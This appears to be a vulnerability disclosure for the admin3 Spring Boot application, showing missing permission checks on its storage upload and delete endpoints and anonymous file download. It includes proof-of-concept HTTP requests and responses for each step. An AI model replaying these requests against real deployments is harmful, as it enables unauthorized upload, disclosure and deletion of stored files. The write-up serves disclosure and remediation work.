# admin3 Unauthorized File Upload + Anonymous Download and delete

## Introduction to Vulnerabilities

The storage endpoints of **admin3** (Spring Boot 3.2.3) are missing permission checks. `/storage/upload` has no `@RequiresPermissions` (unlike `/storage/configs` which correctly requires `storage:view` / `storage:create`), and `/storage/fetch/**` / `/storage/download/**` are additionally excluded from the login interceptor. Any logged-in user (even with zero permissions) can upload arbitrary files, and any anonymous attacker can download them.

## Affected Versions

admin3-main `admin3-server` (tech.wetech.admin3, Spring Boot 3.2.3 + JDK 21)

## Utilize conditions

- A logged-in account for upload; anonymous for download and delete

## Vulnerability Reproduction

**Source** — `/storage/upload` missing `@RequiresPermissions` (contrast with `/storage/configs`):

```java
// tech/wetech/admin3/controller/StorageController.java
@PostMapping("/upload")                                        // no @RequiresPermissions
@DeleteMapping("/files/{key:.+}")                              // no @RequiresPermissions

@GetMapping("/configs")  @RequiresPermissions("storage:view")  // control, has annotation
```

![image-20260815212432268](https://github.com/fangtang7/picx-images-hosting/raw/master/admin3/image-20260815212432268.54yhjott7h.webp)

**Sink** — login interceptor whitelists fetch/download (fully anonymous):

```java
// tech/wetech/admin3/infra/WebMvcConfiguration.java
loginInterceptor.excludePathPatterns("/storage/fetch/**", "/storage/download/**", "/login", ...);
```

![image-20260815212505521](https://github.com/fangtang7/picx-images-hosting/raw/master/admin3/image-20260815212505521.7q0puget6.webp)

Step 1 - Login as a zero-permission user:

```
POST /admin3/login HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: application/json

{"username":"vulnuser","password":"123456"}
```

```
HTTP/1.1 200
{"token":"6c4aea4e82a343bbbe650ebbe78bdc23","userId":311,"username":"vulnuser","permissions":[]}
```

![image-20260815211535886](https://github.com/fangtang7/picx-images-hosting/raw/master/admin3/image-20260815211535886.7p4bwbuikg.webp)

Step 2 - Unauthorized file upload (no `storage:create` permission, still succeeds):

```
POST /admin3/storage/upload HTTP/1.1
Host: 127.0.0.1:18080
Authorization: Bearer 6c4aea4e82a343bbbe650ebbe78bdc23
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 225

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="files"; filename="vuln_poc.txt"
Content-Type: text/plain

UNAUTHORIZED-UPLOAD-BY-ZERO-PRIVILEGE-USER
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```
HTTP/1.1 200
[{"name":"vuln_poc.txt","createUser":"vulnuser","key":"3pnpt_vuln_poc.txt","url":"storage/fetch/3pnpt_vuln_poc.txt"}]
```

![image-20260815211637679](https://github.com/fangtang7/picx-images-hosting/raw/master/admin3/image-20260815211637679.102w7kxqvc.webp)

Step 3 - Anonymous download of the file (no token):

```
GET /admin3/storage/fetch/3pnpt_vuln_poc.txt HTTP/1.1
Host:127.0.0.1:18080
Content-Length: 10
```

```
HTTP/1.1 200
UNAUTHORIZED-UPLOAD-BY-ZERO-PRIVILEGE-USER
```

![image-20260815212011121](https://github.com/fangtang7/picx-images-hosting/raw/master/admin3/image-20260815212011121.szoc5bxd8.webp)

Step 4 - Unauthorized delete of the file (no `storage:delete` permission, still succeeds):

```
DELETE /admin3/storage/files/3pnpt_vuln_poc.txt HTTP/1.1
Host: 127.0.0.1:18080
Authorization: Bearer bba73278b09c4747ac1b58422eed5b17
```

```
HTTP/1.1 204
```

![image-20260815212132678](https://github.com/fangtang7/picx-images-hosting/raw/master/admin3/image-20260815212132678.1hsxw5zx2x.webp)

## Impact

Any logged-in user can upload arbitrary files (storage abuse); uploaded files can be downloaded anonymously with an enumerable key `{5-char-random}_{filename}` (sensitive file disclosure); `/storage/files/{key}` (DELETE) also has no permission check, allowing unauthorized deletion of any stored file. Server filesystem files are not reachable (`key.contains("../")` is checked). Control: `/storage/configs` returns 403 for the same user.
